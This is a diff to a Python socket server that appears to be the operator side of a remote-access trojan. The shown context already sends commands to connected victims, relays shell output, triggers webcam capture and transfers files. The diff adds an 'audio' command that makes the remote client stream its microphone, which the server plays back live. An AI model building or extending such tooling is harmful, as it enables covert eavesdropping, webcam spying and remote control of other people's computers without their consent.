@@ -1,6 +1,7 @@
 import socket
 import threading
 from queue import Queue
+import pyaudio
 
 connections = []
 addresses = []
@@ -10,6 +11,28 @@ THREADS = 2
 queue = Queue()
 HOST = ''
 PORT = 1234
+
+def audio(c):
+    chunk = 1024
+    FORMAT = pyaudio.paInt16
+    channels = 1
+    sample_rate = 44100
+    record_seconds = 5
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT,
+                    channels=channels,
+                    rate=sample_rate,
+                    input=True,
+                    output=True,
+                    frames_per_buffer=chunk)
+
+    try:
+        while True:
+            data = c.recv(1024)
+            stream.write(data)
+    except KeyboardInterrupt:
+        pass
+
 
 def transfer(c):
     destination = input("Enter the destination location: ")
@@ -144,11 +167,16 @@ def connect(c):
                 c.send(cmd.encode())
                 webcam(c)
                 continue
+            elif cmd == 'audio':
+                c.send(cmd.encode())
+                audio(c)
+                continue
             c.send(cmd.encode())
             shell = c.recv(1024).decode()
             print(c.recv(10240).decode())
-        except:
+        except Exception as e:
             print("Connection was lost!")
+            print(e)
             break
 
 def start():
